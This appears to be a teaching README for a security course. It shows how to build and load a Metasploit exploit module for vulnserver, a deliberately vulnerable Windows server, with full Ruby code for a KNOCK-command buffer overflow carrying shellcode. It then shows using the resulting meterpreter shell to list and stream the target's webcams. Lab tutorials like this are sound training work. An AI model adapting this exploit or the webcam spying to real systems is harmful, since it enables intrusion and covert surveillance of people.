# Create metasploit module against vulnserver
Our customized Kali VM is used in this project. The new exploit module is against [vulnserver](../vulnserver).

[![Video demo of creating metasploit new module](https://img.youtube.com/vi/fnrLCSmILHE/0.jpg)](https://youtu.be/fnrLCSmILHE)

## Update metasploit
The default installed metasploit in Kali has some issues with newly created modules in a user folder (?). For example, it cannot incorporate such modules into the exploit database. Updating the metasploit-framework solves such issue.
```
sudo apt update; sudo apt install metasploit-framework 
```
If a module is copied to the [metasploit modules folder](https://www.offensive-security.com/metasploit-unleashed/modules-and-locations/) (e.g. /usr/share/metasploit-framework/modules/), there is no such module incorporating issue. 

## Create a custom module in the user kali folder

We have two choices, creating a new module, which can be used by everyone or only the logged-in user. The first choice is preferred
1. Create a new module that can be used by everyone. The new module shall stay in a subfolder of */usr/share/metasploit-framework/modules/*. The subfolders are used to categorize modules.

We will put our vulnserver modules including knock.rb in the folder of */usr/share/metasploit-framework/modules/exploits/windows/vulnserver/*.
```
sudo su	# become root
mkdir -p /usr/share/metasploit-framework/modules/exploits/windows/vulnserver/ # create the folder holding modules for vulnserver
cd /usr/share/metasploit-framework/modules/exploits/windows/vulnserver/
mousepad knock.rb # copy and paste the knock.rb code, save the file and exit
```
"#" starts a comment. 

2. Create a module which can be used by only the logged-in user (e.g. kali) in ~/.msf4/modules, for example, */home/kali/.msf4/modules/exploits/windows/vulnserver/[knock.rb](knock.rb)*, which is the example module in this repository. The exploit module is similar to the [Python version of the attack](https://github.com/xinwenfu/Malware-Analysis/tree/main/Buffer-Overflow/BOF-Remote).


~~I'm not sure if the following command is needed or not and use it anyway whenever I add a module~~
<pre><code><del>
sudo updatedb
</del>
</pre></code>
~~When metasploit starts, it loads all modules too.~~


In an ongoing Metasploit session, if a module is changed, use the following command within metasploit to reload/refresh all modules
```
reload_all
```

Below is the [new module](knock.rb) code with quite some comments
```
##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
# File path: .msf4/modules/exploits/windows/vulnserver/knock.rb
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = NormalRanking	# Potential impact to the target

  include Msf::Exploit::Remote::Tcp

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Vulnserver Buffer Overflow-KNOCK command',	# Name of the target
      'Description'    => %q{	# Explaining what the module does
         vulnserver is intentially written vulnerable.
      },
      'Author'         => [ 'fxw' ],	## Hacker name
      'License'        => MSF_LICENSE,
      'References'     =>	# References for the vulnerability or exploit
        [
          [ 'URL', 'https://github.com/xinwenfu/Malware-Analysis/edit/main/MetasploitNewModule' ]
        ],
      'Privileged'     => false,
      'DefaultOptions' =>
        {
          'EXITFUNC' => 'thread', # Run the shellcode in a thread and exit the thread when it is done 
        },      
      'Payload'        =>	# How to encode and generate the payload
        {
          'BadChars' => "\x00\x0a"	# Bad characters to avoid in generated shellcode
        },
      'Platform'       => 'Win',	# Supporting what platforms are supported, e.g., win, linux, osx, unix, bsd.
      'Targets'        =>	#  targets for many exploits
        [
          [ 'vulnserver-KNOCK',
            {
              'jmpesp' => 0x6250151C # This will be available in [target['jmpesp']]
            }
          ]
        ],
      'DefaultTarget'  => 0,
      'DisclosureDate' => 'Mar. 30, 2022'))	# When the vulnerability was disclosed in public


    register_options( # Available options: CHOST(), CPORT(), LHOST(), LPORT(), Proxies(), RHOST(), RHOSTS(), RPORT(), SSLVersion()
      [
        Opt::RPORT(9999),
	Opt::LPORT(11111)
      ])
  end

  def exploit	# grammar similar to Python?
    print_status("Connecting to target...")
    connect	# Connect to the target
	  
    shellcode = payload.encoded	# Generated and encoded shellcode
    outbound = "KNOCK /.:/" + "A"*2002 + [target['jmpesp']].pack('V') + "C"*32 + shellcode

    print_status("Trying target #{target.name}...")

    sock.put(outbound)	# Send the attacking payload

    disconnect	# Disconnect the connection
  end
end
```
Once a new module is successfully created, it can be used within both metasploit and armitage.

## Use the new module

### Configure armitage to run as root
Change the original armitage launching command by right clicking the armitage icon and editting *Edit Application ...*
```
sh -c "pkexec msfdb init && armitage"
```
to
```
sh -c "pkexec sudo msfdb init && sudo armitage"
```
In this way, we run armitage as root, remvoing a lot of troubles.


### Run the knock module
Below is a screenshot showing armitage can find the vulnserver attack module **knock**. In case armitage cannot find the module, in the top left module panel, find it via *exploit* -> *Windows* -> *vulnserver* -> *knock* and double click *knock* to start it.

<img src="../imgs/armitage-find-vulnserver-attack.png">

### Start meterpreter shell
Below is a screenshot showing armitage successfully launches the vulnserver attack and we can start a **meterpreter shell** to list webcams on the target Windows 10 VM. Remember attach the webcam to the Windows 10 VM: *Devices* -> *Webcams* -> Click one. The first *webcam_list* command failed because I forgot to attach any camera to the Windows 10 VM.

<img src="../imgs/armitage-find-vulnserver-meterpreter.png">

*webcam_stream* can be used in the meterpreter shell too.

## Notes
### Ruby programming for metasploit modules
In the Ruby script, we can use [register_options](https://www.rubydoc.info/github/rapid7/metasploit-framework/Msf/Opt) to register a few options. Available options: CHOST(), CPORT(), LHOST(), LPORT(), Proxies(), RHOST(), RHOSTS(), RPORT(), and SSLVersion().
```
    register_options(
      [
        Opt::RPORT(9999),
	Opt::LPORT(11111)
      ])
```

### Error running command webcam_stream: Errno::EACCES Permission denied @ rb_sysopen - rGwUKerZ.html
Within a meterpreter session, deploying webcam_stream may have the *EACCES Permission denied* error. This is because when run by the user *kali*, meterpreter starts in the folder of */usr/share/armitage*, which has the root priviledge and cannot be used by the user kali. 

<img src="../imgs/webcam_stream_error.png">

There are two solutions:
1. Change the original armitage command by right clicking the armitage icon and editting *Edit Application ...*
```
sh -c "pkexec msfdb init && armitage"
```
to
```
sh -c "pkexec sudo msfdb init && sudo armitage"
```
In this way, we run armitage as root, reducing a lot of troubles.

2. Within the meterpreter session, use *lcd /home/kali* to change the working folder to the home folder of the user kali. Then we can deploy *webcam_stream* again. However, you may have to wait for a long time until the streaming starts. No idea why yet.

## References
1. [Building A Metasploit Module](https://www.offensive-security.com/metasploit-unleashed/building-module/)
2. [Exploiting Simple Buffer Overflow (3) - Writing a simple Metasploit module](https://taishi8117.github.io/2016/07/24/bof-metasploit/), 24 Jul 2016
3. Peleus, [Converting Metasploit Module to Stand Alone](https://netsec.ws/?p=262)
4. v4L, [What Is Metasploit EXITFUNC?](https://www.hacking-tutorial.com/tips-and-trick/what-is-metasploit-exitfunc/#sthash.zpY6gQrl.Mz7vtiHY.dpbs)
5. [rapid7/metasploit-framework](https://github.com/rapid7/metasploit-framework/wiki/), Metasploit Development
6. Ivan, [Rewriting a Ruby msf exploit in Python](https://ivanitlearning.wordpress.com/2019/09/01/rewriting-a-ruby-msf-exploit-in-python/), September 1, 2019
7. [Incident Response and the ATT&CK Matrix 2020 CTF](https://samsclass.info/152/IR2020.htm), Writing a Custom Metasploit Module
8. [Ruby metasploit-framework class list](https://www.rubydoc.info/github/rapid7/metasploit-framework/)
